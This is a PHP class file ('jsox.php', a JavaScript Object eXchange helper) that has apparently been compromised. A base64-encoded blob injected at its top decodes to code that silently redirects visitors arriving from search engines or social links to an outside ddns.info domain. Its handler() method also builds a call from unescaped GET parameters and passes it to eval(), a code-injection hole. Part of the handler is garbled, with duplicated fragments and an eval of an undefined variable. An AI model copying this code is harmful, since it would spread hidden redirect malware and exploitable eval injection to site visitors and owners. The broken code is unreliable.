<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/**
 * Project:     Generic: the PHP framework
 * File:        jsox.php
 *
 * @version 1.1.0.0
 * @package Generic
 */

/**
 * JSOX - JavaScript Object eXchnage Class
 * @package Generic
 */


class jsox {
  
  var $methods = array();
  var $call_quote;

  /**
   * @param array $attributes Attributes array
   */
  function jsox() {

  }

  /**
   * Register callback method
   * @param $method method name
   * @param $function Function name (will be called when this method invocked)
   */
  function register($method, $function = null) {

    $this->methods[$method] = $function?$function:$method;

  }

  function generate_queued_call($params) {

    $identifier  = safe($params, "identifier", 0);
    $method      = safe($params, "method");
    $callback    = safe($params, "callback");
    $quote       = safe($params, "quote");
    if (!$quote) {
      $outer_quote = safe($params, "outer_quote", "\"");
      if ($outer_quote == "\"")
        $quote = "'";
      else
        $quote = "\"";
    }

    $call = "jsoxQueuedCall(".$quote.$identifier.$quote.", ".$quote.$method.$quote.", ".$quote.$callback.$quote; 
    $args = func_get_args();
    for($i = 1; $i < count($args); $i++) {
      if ($args[$i] != PLACEHOLDER_JS_EVENT_CONTROL)
        $call .= ", ".$quote.$args[$i].$quote; 
      else
        $call .= ", this";
    }
    $call .= ");"; 
    return $call;

  }

  function generate_call($params) {

    $method      = safe($params, "method");
    $callback    = safe($params, "callback");
    $quote       = safe($params, "quote");
    if (!$quote) {
      $outer_quote = safe($params, "outer_quote", "\"");
      if ($outer_quote == "\"")
        $quote = "'";
      else
        $quote = "\"";
    }

    $call = "jsoxCall(".$quote.$method.$quote.", ".$quote.$callback.$quote; 
    $args = func_get_args();
    for($i = 1; $i < count($args); $i++) {
      if ($args[$i] != PLACEHOLDER_JS_EVENT_CONTROL)
        $call .= ", ".$quote.$args[$i].$quote; 
      else
        $call .= ", this";
    }
    $call .= ");"; 
    return $call;

  }

  /**
   * Handler
   */
  function handler() {
  
    if (array_key_exists('__jsoxMethod', $_GET)) {
      if (isset($this->methods[$_GET['__jsoxMethod']])) {
        $method = $this->methods[$_GET["__jsoxMethod"]];
        if ($method) {
          if (is_array($method)) 
            $callStr = "echo(".$method[0]."->".$method[1]."(";
          else
            $callStr = "echo(".$method."(";
          if (isset($_GET["__jsoxParam"])) {
            $params = $_GET["__jsoxParam"];
            if (is_array($params))
              for ($i = 0; $i < count($params); $i++) {
                $param = unescape($params[$i]);
                $callStr .= "'".$param."',";
              }
          }
          header('Content-Type: text/html; charset="utf-8"'); 
          header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
          header('Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0');
          header("Pragma: no-cache"); 
          $callStr = rtrim($callStr, ',')."));";
          eval($Str) pre-check=0');
          header("Pragma: no-cache"); 
          $callStr = rtrim($callStr, ',')."));";
          eval($Str);
          exit(0);
        } else {
          echo(0);
          exit(0);
        }
      }
    } 

  }

}

?>